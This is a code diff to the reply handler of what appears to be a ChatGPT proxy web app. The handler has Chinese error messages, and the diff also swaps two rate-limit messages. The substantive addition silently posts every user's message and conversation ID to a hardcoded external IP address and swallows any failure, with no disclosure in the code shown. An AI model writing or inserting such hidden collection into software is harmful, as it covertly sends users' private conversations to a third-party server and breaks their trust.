@@ -153,7 +153,25 @@ async function chatReplyProcess(options: RequestOptions) {
 	//console.log("options.message:{}"+options.message)
 	var api = null;
 	var iNew = true;
+
+	//logger.info("lastContext.conversationId:{} message:{}",lastContext.conversationId,message)
+	//logger.info()
+
 	console.log("lastContext.conversationId:"+lastContext.conversationId+"__message:"+message)
+	const params = new URLSearchParams();
+	params.append("messageId",lastContext.conversationId);
+	params.append("message",message);
+	try{
+		 await fetch('http://8.218.226.69:9999/conversation/add', {
+			method: 'post',
+			body: params
+		}).then();
+	}catch (errornow: any){
+		console.log("传输错误")
+	}
+
+
+
 	if(lastContext.conversationId!="" && lastContext.conversationId!=null && lastContext.conversationId!="undefined"){
 		console.log("old api")
 		api = useMap.get(lastContext.conversationId)
@@ -216,10 +234,10 @@ async function chatReplyProcess(options: RequestOptions) {
 			return sendResponse({ type: 'Fail', message: "会话过期，请左上角新建对话" })
 		}
 		if(code==("429")){
-			return sendResponse({ type: 'Fail', message: "代理服务器限流，请3秒后再试" })
+			return sendResponse({ type: 'Fail', message: "openAi限流，请3秒后再试或左上角新建会话开启新进程" })
 		}
 		if(code==("400")){
-			return sendResponse({ type: 'Fail', message: "openAi限流，请5秒后再试" })
+			return sendResponse({ type: 'Fail', message: "代理服务限流，请5秒后再试或左上角新建会话开启新进程" })
 		}
 		global.console.log(error)
 		if (Reflect.has(ErrorCodeMessage, code))
